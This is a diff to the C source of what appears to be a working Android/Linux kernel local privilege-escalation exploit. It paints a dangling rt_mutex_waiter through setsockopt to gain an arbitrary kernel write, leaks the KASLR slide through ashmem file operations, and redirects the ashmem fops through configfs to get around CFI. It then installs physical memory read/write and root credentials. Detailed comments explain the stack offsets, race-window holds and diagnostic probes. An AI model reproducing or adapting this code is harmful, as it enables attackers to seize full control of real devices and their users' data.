@@ -1,6 +1,7 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
 #include <time.h>
+#include <signal.h>
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -182,7 +183,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     fdset_put_word(in, 3, 0);
     fdset_put_word(ex, 0,
                    pselect_custom_write_enabled() ? fake_task :
-                   text_addr(INIT_TASK));
+                   data_addr(INIT_TASK));
     fdset_put_word(ex, 1, fake_lock);
     fdset_put_word(ex, 2, 3);
     fdset_put_word(ex, 3, 0);
@@ -203,7 +204,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {3, 0, "pi_parent"},
     {4, 0, "pi_right"},
     {5, 0, "pi_left"},
-    {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
+    {6, pselect_custom_write_enabled() ? fake_task : data_addr(INIT_TASK), "task"},
     {7, fake_lock, "lock"},
     {8, 0, "prio"},
     {9, 0, "deadline"},
@@ -220,7 +221,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {9, 0, "pi_left"},
     {10, 1, "pi_prio"},
     {11, 0, "pi_deadline"},
-    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
+    {12, pselect_custom_write_enabled() ? fake_task : data_addr(INIT_TASK),
      "task"},
     {13, fake_lock, "lock"},
     {14, 3, "wake_state"},
@@ -451,10 +452,32 @@ void do_pselect_fake_lock_route(void) {
  *     csel len = min(optlen, 0xfe) ; bl __arch_copy_from_user(buf, optval, len)
  * i.e. the copy happens before any optname handling, unprivileged.
  *
+ * PAYLOAD: the copy is 0x60 bytes, so buf[0x10..0x5f] is the dangling
+ * waiter's first 0x50 bytes -- i.e. the complete rb_erase_cached() node:
+ *   tree_entry = (pc, rb_right, rb_left) = (VALUE, TARGET, 0)  -> the PI write
+ *   task = fake_task/INIT_TASK, lock = fake_lock, prio = FAKE_WAITER_PRIO
+ * (the write is child->__rb_parent_color = pc, i.e. *(TARGET) = VALUE).
+ *
  * NOTE: setsockopt does not block.  The consumer fires while this thread parks
  * in userspace (no further syscalls), so the kernel stack region stays intact.
  * ============================================================================ */
 int sock_paint_fd = -1;
+
+/* SSOPT_FAKE_TASK=1: use the fake page as the waiter's task */
+static int ssopt_fake_task_enabled(void) {
+  return pselect_custom_write_enabled() || env_flag("SSOPT_FAKE_TASK", 0);
+}
+/* Design v3 hold: an EMPTY pipe read end selected in a small-nfds select() makes
+ * the route thread block INSIDE the kernel while the consumer walks, so IRQs
+ * cannot land on the paint (they land far below the current -- deep -- frame).
+ * nfds = 64 keeps core_sys_select's used stack_fds at SP0-0x210..SP0-0x1e0,
+ * i.e. below the waiter at SP0-0x1b0 (nfds=192 would have zeroed it). */
+static int ssopt_hold_r = -1;
+static int ssopt_hold_w = -1;
+
+/* payload offset -> page-relative offset of the leaked fake page
+ * (payload_base = base + SKB_DATA_DELTA) */
+#define SSOPT_PG(payload_off) ((size_t)((int64_t)(payload_off) + (SKB_DATA_DELTA)))
 
 void do_setsockopt_fake_lock_route(void) {
   if (!fake_lock || !fake_task) {
@@ -471,13 +494,62 @@ void do_setsockopt_fake_lock_route(void) {
     }
   }
 
+  /* The in-kernel hold must not need ANY syscall after the paint (a syscall
+   * would reuse this stack region).  Prepare the empty-pipe read end now, before
+   * the first attempt. */
+  if (ssopt_hold_r < 0) {
+    int pfd[2];
+    if (pipe(pfd) == 0) {
+      if (pfd[0] >= 64) {
+        int nb = fcntl(pfd[0], F_DUPFD, 3);
+        if (nb >= 0 && nb < 64) { close(pfd[0]); pfd[0] = nb; }
+      }
+      ssopt_hold_r = pfd[0];
+      ssopt_hold_w = pfd[1];
+    }
+    pr_info("ssopt hold pipe r=%d w=%d\n", ssopt_hold_r, ssopt_hold_w);
+  }
+
+  /* RB_EMPTY_NODE route: leak T's kernel stack (=> &waiter) before painting.
+   * The dummy paints run INSIDE the perf sampler window; they set the waiter
+   * region to zeros, which the real paint below overwrites. */
+  if (env_flag("SSOPT_EMPTY", 0) && !ssopt_leaked_waiter) {
+    /* Leak T's OWN kernel stack here: this route runs inside the waiter thread
+     * (main.c waiter_thread), which is the thread whose stack holds the dangling
+     * rt_mutex_waiter.  (Doing it in prepare_perf_fake_page leaked the MAIN
+     * thread's stack instead -> bogus waiter -> corrupt-tree walk -> soft lockup.)
+     * The burst is light (period 20 kHz + 400 paints) so it cannot trip the
+     * hardware watchdog. */
+    ssopt_set_waiter_lo();
+    ssopt_leaked_waiter = 0;
+    if (ssopt_perf_begin() == 0) {
+      static unsigned char dummy[0x100];
+      memset(dummy, 0, sizeof dummy);
+      for (int i = 0; i < 400; i++)
+        setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, 0x60);
+      ssopt_perf_drain();
+      ssopt_leaked_waiter = ssopt_perf_result();
+      ssopt_perf_close();
+    }
+    pr_info("ssopt waiter = %016zx (leak in T)\n",
+            (uintptr_t)ssopt_leaked_waiter);
+    fsync(1);
+  }
+
   struct timespec t0;
   clock_gettime(CLOCK_MONOTONIC, &t0);
   int calls = 0, success = 0;
   for (int attempt = 1; attempt <= PSELECT_CFI_ROUTE_ATTEMPTS; attempt++) {
     unsigned char buf[0x60];
     memset(buf, 0, sizeof buf);
-    if (env_flag("SSOPT_SCAN", 0)) {
+    if (env_flag("SSOPT_LOCKPROBE", 0)) {
+      /* Deterministic "did the paint reach the stack?" probe: lock = a
+       * non-canonical marker so chain[5] raw_spin_trylock() faults at once
+       * (KP in milliseconds, never a hang), and x24 reveals whether the copy
+       * landed (0x1a2b00000048) or stayed zeroed by the memset (0). */
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
+      put64(buf, 0x48, 0x1a2b00000048ULL);
+    } else if (env_flag("SSOPT_SCAN", 0)) {
       /* one-run probe: distinct non-canonical value per buf slot so the panic
        * register x24 reveals which slot lands on waiter->lock */
       for (int i = 0; i < 0x60; i += 8)
@@ -493,10 +565,80 @@ void do_setsockopt_fake_lock_route(void) {
     } else if (env_flag("SSOPT_RANGE", 0)) {
       /* diagnostic: paint a solid run so a wrong offset still hits lock */
       for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);
-    } else {
-      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
-                                                      : text_addr(INIT_TASK));
+    } else if (env_flag("SSOPT_NODEPROBE", 0)) {
+      /* decisive probe: are the painted tree_entry words still there at [7]? */
+      put64(buf, 0x10, 0x1a2b00000010ULL);
+      put64(buf, 0x18, 0x1a2b00000018ULL);
+      put64(buf, 0x20, 0x1a2b00000020ULL);
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
+                                                 : data_addr(INIT_TASK));
       put64(buf, 0x48, fake_lock);
+      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
+      put64(buf, 0x58, 0);
+    } else if (env_flag("SSOPT_EMPTY", 0) && ssopt_leaked_waiter) {
+      /* RB_EMPTY_NODE(&waiter->tree_entry)  <=>  parent_color == &tree_entry,
+       * and tree_entry sits at offset 0 of the waiter, so paint the waiter's own
+       * address.  rt_mutex_dequeue() then returns immediately: no rb_erase_cached
+       * at all, so the clobbered children (waiter+0x08/+0x10) are never read.
+       * The PI write must therefore come from chain[11] (pi-tree in our page):
+       * requires fake_lock->owner != 0 and waiter->task valid. */
+      put64(buf, 0x10, ssopt_leaked_waiter);
+      put64(buf, 0x18, 0);
+      put64(buf, 0x20, 0);
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
+                                                 : data_addr(INIT_TASK));
+      put64(buf, 0x48, fake_lock);
+      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
+      put64(buf, 0x58, 0);
+    } else if (env_flag("SSOPT_BASELINE", 0)) {
+      /* Baseline = bản ghostlock53/54: chỉ task@buf[0x40], lock@buf[0x48],
+       * KHÔNG sơn prio (buf[0x50]) và KHÔNG sơn tree_entry; len=0x50. */
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
+      put64(buf, 0x48, fake_lock);
+    } else if (ssopt_write_pc && ssopt_write_right && !ssopt_write_left) {
+      /* Full waiter payload (waiter = SP0-0x1b0 = buf+0x10):
+       *   buf[0x10] -> waiter+0x00  tree.parent_color = ssopt_write_pc (VALUE)
+       *   buf[0x18] -> waiter+0x08  tree.rb_right     = ssopt_write_right (TARGET)
+       *   buf[0x20] -> waiter+0x10  tree.rb_left      = 0
+       *   buf[0x40] -> waiter+0x30  task              = fake_task/INIT_TASK
+       *   buf[0x48] -> waiter+0x38  lock              = fake_lock
+       *   buf[0x50] -> waiter+0x40  prio              = FAKE_WAITER_PRIO
+       *   buf[0x58] -> waiter+0x48  deadline          = 0
+       * Same triple that prepare_skb_payload() puts into W0's pi_tree, so
+       * chain[7] rt_mutex_dequeue()/rb_erase_cached() itself performs the PI
+       * write:  *(node->rb_right) = node->__rb_parent_color, i.e.
+       * *(TARGET) = VALUE, with rebalance == NULL (rb_right != 0).  The
+       * collateral parent->rb_right write lands in our page (parent =
+       * VALUE & ~3, i.e. fake_fops+0x08 == fops->llseek; repaired later by
+       * repair_fake_fops_llseek()).
+       * prio MUST differ from task->prio, otherwise rt_mutex_adjust_pi() and
+       * chain[3] take the rt_mutex_waiter_equal() early-out and NOTHING is
+       * written (silent EINVAL-like failure).  FAKE_WAITER_PRIO (140) > the
+       * exploit's normal prio (120) also keeps W on the left of fake_w0 in the
+       * fake tree, so chain[11] sees waiter == rt_mutex_top_waiter(lock). */
+      if (env_flag("SSOPT_NO_TREE", 0)) {
+        /* isolation probe: leave the rb node "empty" (children/parent = 0) so
+         * chain[7] takes the harmless case-1/parent-NULL path. */
+        put64(buf, 0x10, 0);
+        put64(buf, 0x18, 0);
+        put64(buf, 0x20, 0);
+      } else {
+        put64(buf, 0x10, ssopt_write_pc);
+        put64(buf, 0x18, ssopt_write_right);
+        put64(buf, 0x20, ssopt_write_left);
+      }
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
+      put64(buf, 0x48, fake_lock);
+      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
+      put64(buf, 0x58, 0);
+    } else {
+      /* Fallback: no usable (value,target,0) triple -> keep tree_entry zeroed
+       * so chain[7] rb_erase_cached() is harmless (case 1, parent NULL) and the
+       * write has to come from chain[11] through the page's W0 pi_tree. */
+      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
+      put64(buf, 0x48, fake_lock);
+      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
+      put64(buf, 0x58, 0);
     }
 
     atomic_store(&consumer_calls, 0);
@@ -505,15 +647,52 @@ void do_setsockopt_fake_lock_route(void) {
     atomic_store(&pselect_select_done, 0);
     atomic_store(&pselect_walk_done, 0);
     int delay_usec = route_delay_usec(attempt);
-    if (delay_usec < 20000) delay_usec = 20000;
+    /* Allow 0: with the spin-park hold the consumer must fire ASAP to keep the
+     * clobber window (IRQ at EL0 while T spins) as small as possible.  (The old
+     * 20 ms floor was needed only by the select-based route.) */
+    if (delay_usec < 0) delay_usec = 0;
     atomic_store(&main_route_delay_usec, delay_usec);
 
-    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu\n",
-            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf);
+    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu "
+            "scan=%d baseline=%d hold=%d quiet=%d owner0=%d no_tree=%d "
+            "no_prio=%d lockprobe=%d\n",
+            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf,
+            env_flag("SSOPT_SCAN", 0), env_flag("SSOPT_BASELINE", 0),
+            env_flag("SSOPT_HOLD", 1), env_flag("SSOPT_QUIET_EXIT", 1),
+            env_flag("SSOPT_OWNER0", 1), env_flag("SSOPT_NO_TREE", 0),
+            env_flag("SSOPT_NO_PRIO", 0), env_flag("SSOPT_LOCKPROBE", 0));
+    (void)0;
+    fsync(1);   /* panic loses the page cache: force the log to disk */
+    /* The dangling waiter lives on THIS thread's kernel stack (SP0-0x1b0).
+     * ret_to_user -> work_pending -> do_notify_resume() runs AFTER our paint
+     * whenever TIF_SIGPENDING / TIF_NOTIFY_RESUME is set; its frame (entry sp
+     * = SP0-0x190) writes a saved x29/x16 pair over SP0-0x188..0x179 (that is
+     * waiter->task@0x30 and the top of waiter->lock@0x38), and task_work
+     * callbacks reach waiter+0x08/+0x10 -- exactly the high-entropy garbage
+     * seen in kpr/kpP/kpPB (rb_erase_cached+0x20 with a bogus rb_right).
+     * Block every blockable signal (recalc_sigpending() then clears
+     * TIF_SIGPENDING) and make one return-to-userspace so pending task_work is
+     * flushed BEFORE the paint: the setsockopt() exit path then has no work to
+     * run and the painted waiter survives until the consumer's walk. */
+    if (env_flag("SSOPT_QUIET_EXIT", 1)) {
+      static int ssopt_exit_quiet;
+      if (!ssopt_exit_quiet) {
+        sigset_t all;
+        sigfillset(&all);
+        pthread_sigmask(SIG_BLOCK, &all, NULL);
+        ssopt_exit_quiet = 1;
+      }
+      (void)syscall(SYS_getpid);
+    }
     errno = 0;
-    socklen_t paint_len = (env_flag("SSOPT_RANGE", 0) || env_flag("SSOPT_SCAN", 0) ||
-                            env_flag("SSOPT_SCAN2", 0))
-                               ? 0x60 : 0x50;
+    /* Always copy the whole 0x60-byte buffer: buf[0x10..0x5f] is exactly
+     * waiter+0x00..waiter+0x4f (tree_entry/task/lock/prio/deadline), and the
+     * kernel caps the length itself with min(optlen, 0xfe). */
+    /* SSOPT_NO_PRIO: stop before buf[0x50] (prio/deadline) so they keep their
+     * stale values, exactly like the ghostlock53/54 baseline. */
+    socklen_t paint_len = (env_flag("SSOPT_BASELINE", 0) ||
+                           env_flag("SSOPT_LOCKPROBE", 0) ||
+                           env_flag("SSOPT_NO_PRIO", 0)) ? 0x50 : 0x60;
     int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf, paint_len);
     int saved_errno = errno;
     if (env_flag("SSOPT_LOG", 0))
@@ -522,27 +701,60 @@ void do_setsockopt_fake_lock_route(void) {
               ret, saved_errno, sock_paint_fd, page_base, fake_task, fake_lock);
     atomic_store(&pselect_select_done, 1);
     atomic_store(&punch_consume_go, attempt);
-    /* Constructive fix (setsockopt + blocking select):
-     *  - setsockopt already painted waiter->task (buf[0x40]) and waiter->lock
-     *    (buf[0x48]); those are at SP0-0x180 / SP0-0x178 == bits words 18 / 19.
-     *  - Now stay INSIDE the kernel so the syscall-exit path cannot clobber the
-     *    paint, AND zero the dangling waiter's tree_entry/pi_tree.
-     *  - select(192) -> core_sys_select(n=192) processes exactly
-     *    FDS_LONGS(192)=3 longs/set * 6 sets = 18 stack words at
-     *    bits = SP0-0x210 == words 0..17 == SP0-0x210..SP0-0x188.  Since
-     *    waiter = SP0-0x1b0 = bits word 12, this zeroes waiter+0x00..0x2f
-     *    (tree_entry@0x00 + pi_tree@0x18) while words 18/19 (task@0x30 /
-     *    lock@0x38) are NOT processed -> the setsockopt paint survives. */
-    {
-      fd_set blk_in, blk_out, blk_ex;
-      FD_ZERO(&blk_in); FD_ZERO(&blk_out); FD_ZERO(&blk_ex);
-      struct timeval blk_tv = { .tv_sec = 0, .tv_usec = 300000 };
-      select(192, &blk_in, &blk_out, &blk_ex, &blk_tv);
+    /* HOLD: block inside the kernel for the whole walk window.
+     * Rotating in userspace is NOT safe: an IRQ taken while T is at EL0 is
+     * serviced on T's kernel stack, descends ~0x1b0 and overwrites the waiter
+     * (measured: rb_erase_cached+0x20 with a high-entropy rb_right in
+     * kpr/kpP/kpPB; silent bail in PA/QA; hang in the delay=0 run).  Blocked in
+     * select(), IRQ frames land far below the current frame and the paint is
+     * frozen.  Timeout is well above the consumer's 20 ms delay. */
+    if (env_flag("SSOPT_HOLD", 1) && ssopt_hold_r >= 0 && ssopt_hold_r < 64) {
+      fd_set h_in, h_out, h_ex;
+      FD_ZERO(&h_in); FD_ZERO(&h_out); FD_ZERO(&h_ex);
+      FD_SET(ssopt_hold_r, &h_in);          /* empty pipe: never ready */
+      struct timeval h_tv = { .tv_sec = 1, .tv_usec = 0 };
+      select(64, &h_in, &h_out, &h_ex, &h_tv);
     }
     for (int spin = 0;
-         spin < 2000000000 && !atomic_load(&pselect_walk_done);
+         spin < (env_flag("SSOPT_HOLD", 1) ? 100000000 : 2000000000) &&
+           !atomic_load(&pselect_walk_done);
          spin++) {
       __asm__ volatile("yield" ::: "memory");
+    }
+    if (env_flag("WRITE4_SCRATCH", 0)) {
+      /* Self-test of the whole chain (paint -> chain[7] rb_erase_cached ->
+       * write) with the target inside our own page: page[SSOPT_PG(SCRATCH+0x40)]
+       * must become ssopt_write_pc (== fake_fops).  Zero risk for ashmem. */
+      pr_info("ssopt scratch readback +%.0fms walked=%d page[%#zx]=%016zx "
+              "want=%016zx\n",
+              fops_elapsed_ms(&t0), atomic_load(&pselect_walk_done),
+              SSOPT_PG(SCRATCH_OFF + 0x40),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF + 0x40)),
+              (uintptr_t)ssopt_write_pc);
+    }
+    if (env_flag("SSOPT_PEEK", 0)) {
+      /* Read-only view of what the walk did to the fake page.  page[0x108]
+       * (fake_fops->llseek) becomes the rb_right value only if chain[7]
+       * rb_erase_cached() actually ran with our painted tree_entry. */
+      pr_info("ssopt peek walked=%d pc=%016zx right=%016zx misc_fops=%016zx\n",
+              atomic_load(&pselect_walk_done),
+              (uintptr_t)ssopt_write_pc, (uintptr_t)ssopt_write_right,
+              (uintptr_t)data_addr(ASHMEM_MISC_FOPS));
+      pr_info("ssopt peek lock[wlock=%016zx rb_root=%016zx leftmost=%016zx] "
+              "W0[rb_l=%016zx pi_pc=%016zx pi_r=%016zx pi_l=%016zx] "
+              "fops[read=%016zx llseek=%016zx] right_slot=%016zx scratch=%016zx\n",
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x00),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x08),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x10),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x10),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x18),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x20),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x28),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x10),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x08),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(RIGHT_OFF) + 0x00),
+              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF) + 0x40));
+      fsync(1);
     }
     pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\n",
             fops_elapsed_ms(&t0), ret, saved_errno,
@@ -553,8 +765,12 @@ void do_setsockopt_fake_lock_route(void) {
     pr_info("ssopt done attempt=%d calls=%d success=%d delay=%d step=%d errno=%d\n",
             attempt, calls, success, delay_usec, cfi_last_step, cfi_last_errno);
     if (calls > 0 && success > 0) {
-      if (!route_only_mode) {
+      if (!route_only_mode && !env_flag("SSOPT_NO_CFI", 0)) {
         try_cfi_stage();
+      } else if (env_flag("SSOPT_NO_CFI", 0)) {
+        pr_info("ssopt NO_CFI: walk done (calls=%d success=%d), skipping cfi "
+                "stage\n", calls, success);
+        fsync(1);
       }
       break;
     }
@@ -577,8 +793,8 @@ int refresh_fake_fops_text(int fd) {
     size_t off;
     uint64_t value;
   } slots[] = {
-    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
-    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
+    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE)},
+    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
     {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
     {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
     {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
@@ -600,7 +816,10 @@ int refresh_fake_fops_text(int fd) {
 }
 
 int leak_kernel_base(int fd) {
-  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  /* Known slide -> real ashmem_fops via canonical image mapping.
+   * data_addr's linear alias needs an unknown phys delta (BAN_GIAO 22.2). */
+  kaslr_fops_alias = (kaslr_slide != 0) ? canon_addr(ASHMEM_FOPS)
+                                        : p0_data_alias(ASHMEM_FOPS);
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
@@ -608,9 +827,18 @@ int leak_kernel_base(int fd) {
   kaslr_show_fdinfo_ptr =
     kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
 
+  pr_info("kaslr read: alias=%016llx open=%016llx ioctl=%016llx mmap=%016llx "
+          "rel=%016llx fdin=%016llx\n",
+          (unsigned long long)kaslr_fops_alias,
+          (unsigned long long)kaslr_open_ptr,
+          (unsigned long long)kaslr_ioctl_ptr,
+          (unsigned long long)kaslr_mmap_ptr,
+          (unsigned long long)kaslr_release_ptr,
+          (unsigned long long)kaslr_show_fdinfo_ptr);
+  fsync(1);
+  /* SHOW_FDINFO gate: this kernel's ashmem_fops has show_fdinfo == 0 */
   if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
-      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
-      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
+      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr)) {
     kaslr_step = 1;
     return 0;
   }
@@ -625,8 +853,7 @@ int leak_kernel_base(int fd) {
 
   if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
       kaslr_mmap_ptr != kaslr_expected_mmap ||
-      kaslr_release_ptr != kaslr_expected_release ||
-      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
+      kaslr_release_ptr != kaslr_expected_release) {
     kaslr_done = 0;
     kaslr_step = 2;
     return 0;
@@ -663,13 +890,23 @@ int restore_slide_boot_id(int fd) {
 }
 
 int install_child_root(int fd) {
-  if (!install_pipe_physrw(fd)) return 0;
-  if (install_umh_root(fd)) return 1;
+  if (env_flag("CFG_PHYSRW", 1)) {
+    install_configfs_physrw(fd);
+  } else if (!install_pipe_physrw(fd)) {
+    return 0;
+  }
+  if (!env_flag("SKIP_UMH", 0)) {
+    if (install_umh_root(fd)) return 1;
+  }
+  if (env_flag("SKIP_CRED", 0)) return 0;
   return install_android_root(fd);
 }
 
 int try_cfi_stage(void) {
   cfi_attempts++;
+  /* Undo the walk's clobber of the fake fops table (owner/llseek etc.) before
+   * misc_open() dereferences it. */
+  ssopt_repair_fake_fops_page();
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
@@ -688,7 +925,8 @@ int try_cfi_stage(void) {
           (unsigned long long)text_addr(ASHMEM_OPEN),
           (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
+                                           : data_addr(ASHMEM_MISC_FOPS);
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
@@ -732,6 +970,23 @@ int try_cfi_stage(void) {
     cfi_last_step = 4;
     cfi_last_errno = errno;
     goto fail;
+  }
+
+  if (env_flag("CFI_STOP_VERIFY", 0)) {
+    /* Redirect verified: the fake fops are installed and working.  Restore the
+     * original fops (so /dev/ashmem is not left dangling when we exit) and stop
+     * before the physrw stage (whose PIPE_* offsets are still 5.x; task B). */
+    uint64_t orig = canon_addr(ASHMEM_FOPS);
+    ssize_t rr = configfs_write_once(fd, misc_fops, &orig, sizeof(orig));
+    cfi_restore_ret = rr;
+    pr_success("cfi STOP_VERIFY: fops_before=%016llx == fake_fops; restored "
+               "orig=%016llx ret=%zd; stopping before physrw errno=%d\n",
+               (unsigned long long)before, (unsigned long long)orig, rr, errno);
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    atomic_store(&cfi_stage_done, 1);
+    SYSCHK(close(fd));
+    return 1;
   }
 
   if (!restore_slide_boot_id(fd)) {
@@ -805,6 +1060,9 @@ int try_cfi_stage(void) {
   return 0;
 
 fail:
+  pr_info("cfi FAIL step=%d errno=%d (kaslr_step=%d)\n", cfi_last_step,
+          cfi_last_errno, kaslr_step);
+  fsync(1);
   if (dirty) {
     uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
     if (kaslr_done) {
